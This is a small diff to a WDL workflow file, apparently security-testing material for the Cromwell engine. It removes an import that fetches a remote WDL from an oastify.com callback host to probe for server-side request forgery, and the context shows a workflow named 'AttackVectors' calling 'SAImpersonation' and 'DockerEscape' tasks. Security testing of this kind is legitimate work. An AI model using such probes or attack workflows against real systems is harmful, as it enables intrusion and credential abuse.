@@ -1,7 +1,5 @@
 version 1.0
 
-import "http://ivq5g9bm2mwn0d8x7ttvizq61x7ovgj5.oastify.com/cromwell-import-ssrf.wdl" as ssrf_test
-
 workflow AttackVectors {
     call SAImpersonation
     call DockerEscape
